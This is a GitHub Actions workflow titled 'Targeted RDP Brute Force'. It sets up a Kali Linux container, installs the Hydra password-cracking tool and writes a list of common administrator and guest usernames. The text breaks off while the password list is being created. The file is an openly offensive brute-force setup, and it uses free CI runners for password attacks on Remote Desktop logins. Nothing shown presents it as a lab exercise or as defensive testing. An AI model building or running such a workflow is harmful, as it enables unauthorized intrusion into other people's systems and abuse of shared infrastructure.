name: Targeted RDP Brute Force

on:
  workflow_dispatch:

jobs:
  brute_force_execution:
    runs-on: ubuntu-latest
    container:
      image: kalilinux/kali-rolling
      options: --user root

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v4

      - name: Install Hydra
        run: |
          apt-get update
          apt-get install -y hydra
          
      - name: Prepare User and Password Lists
        run: |
          # Creating Users List
          cat <<EOF > users.txt
          Administrator
          Admin
          administrador
          admin
          Guest
          guest
          Support
          support
          User
          user
          EOF

          # Creating Passwords List
          cat <<EOF > passwords.txt
